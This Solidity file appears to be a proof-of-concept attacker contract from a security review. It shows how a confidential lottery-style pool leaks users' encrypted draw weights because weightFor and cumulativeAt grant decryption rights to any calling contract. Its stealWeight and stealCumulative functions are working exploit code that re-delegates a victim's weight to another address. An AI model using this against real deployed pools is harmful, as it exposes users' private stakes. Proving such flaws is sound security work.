// SPDX-License-Identifier: BSD-3-Clause-Clear
pragma solidity ^0.8.27;

import {FHE, euint128} from "@fhevm/solidity/lib/FHE.sol";
import {ZamaEthereumConfig} from "@fhevm/solidity/config/ZamaConfig.sol";

interface IPoolWeights {
    function weightFor(uint32 drawId, address user) external returns (euint128);
    function cumulativeAt(address account, uint40 target) external returns (euint128);
}

/**
 * AA1 — does `weightFor` hand any caller decryption rights over any user's weight?
 *
 * Both functions grant to `msg.sender` for an arbitrary subject:
 *
 *     function weightFor(uint32 drawId, address user) external returns (euint128) {
 *         euint128 w = FHE.sub(cum(user, snapshotAt), cum(user, periodStart));
 *         FHE.allow(w, msg.sender);      // <- the caller, not the subject
 *     }
 *
 * A direct EOA call cannot capture the return value — a transaction receipt does
 * not carry one — which is why this looked safe. A CONTRACT can: it receives the
 * handle, the ACL grant lands on the contract, and a contract that holds
 * permission may delegate it onward.
 *
 * `totalWeight` is published at every reveal, so a weight is a pool share. This
 * is the primary secret the contract exists to keep.
 *
 * NOT DEPLOYED as part of the product. It exists to answer the question with a
 * transaction rather than an argument.
 */
contract WeightLeakAttacker is ZamaEthereumConfig {
    euint128 public stolen;

    event Stole(address indexed victim, bytes32 handle);

    /// Reads a victim's draw weight and re-delegates it to `to`.
    function stealWeight(address pool, uint32 drawId, address victim, address to) external {
        euint128 w = IPoolWeights(pool).weightFor(drawId, victim);
        // The pool granted this CONTRACT permission, so this contract may pass
        // it on. Nothing here is exotic — it is what an ACL grant means.
        FHE.allow(w, to);
        FHE.allowThis(w);
        stolen = w;
        emit Stole(victim, euint128.unwrap(w));
    }

    /// The same thing through `cumulativeAt`, which is more general: any window.
    function stealCumulative(address pool, address victim, uint40 at, address to) external {
        euint128 c = IPoolWeights(pool).cumulativeAt(victim, at);
        FHE.allow(c, to);
        FHE.allowThis(c);
        stolen = c;
        emit Stole(victim, euint128.unwrap(c));
    }
}
